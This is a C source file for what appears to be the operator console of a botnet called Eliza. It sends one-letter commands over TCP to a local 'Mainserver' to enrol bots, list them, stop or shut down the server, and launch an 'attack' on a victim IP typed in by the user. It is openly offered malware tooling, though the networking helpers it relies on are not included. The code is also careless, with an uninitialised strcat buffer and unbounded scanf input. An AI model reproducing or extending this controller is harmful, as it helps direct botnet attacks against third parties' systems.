#include "stdio.h"
#include "eliza.h"
#include <string.h>
#include <stdlib.h>

int main() {
     system("clear");
     showElizaLogo();
     char input[1024];

     char elizaIp[] = "127.0.0.1";

     while(1) {
          printf("elizahead> ");
		scanf("%s", input);
          if(strcmp(input, "hi") == 0) {
               char antwort[65000];
               printf("[Head] Trying to connect to the Mainserver...\n");
               simpleListenTcp(elizaIp, 5003, "r", sizeof("r"), antwort);
               printf("[Server] %s\n", antwort);
          }
          else if(strcmp(input, "beabot") == 0) {
               char antwort[65000];
               printf("[Head] Trying to connect to the Mainserver...\n");
               simpleListenTcp(elizaIp, 5003, "t", sizeof("t"), antwort);
               printf("[Server] %s\n", antwort);
          }
          else if(strcmp(input, "attack") == 0) {
               char exec[255];
               char targetip[32];
               char antwort[65000];

               printf("vicim ip> ");
               scanf("%s", targetip);
		           strcat(exec, "a");
               strcat(exec, targetip);
               strcat(exec, "!");
               printf("\n[Head] Trying to connect to the Mainserver...\n");
               simpleListenTcp(elizaIp, 5003, exec, strlen(exec), antwort);
               printf("[Server] %s\n", antwort);
          }
          else if(strcmp(input, "showbots") == 0) {
               char antwort[65000];
               printf("\n");
               simpleListenTcp(elizaIp, 5003, "b", sizeof("b"), antwort);
          }
          else if(strcmp(input, "stop") == 0) {
               char antwort[65000];
               simpleListenTcp(elizaIp, 5003, "p", sizeof("p"), antwort);
          }
          else if(strcmp(input, "shutdown") == 0) {
               char antwort[65000];
               printf("[Head] Trying to connect to the Mainserver...\n");
               simpleListenTcp(elizaIp, 5003, "s", sizeof("s"), antwort);
               printf("[Server] %s\n", antwort);
          }
          else if(strcmp(input, "exit") == 0) {
               printf("Bye Bye!\n");
               exit(0);
          }
          else {
               printf("Unknown Command!\n");
          }
     }
     return 0;
}
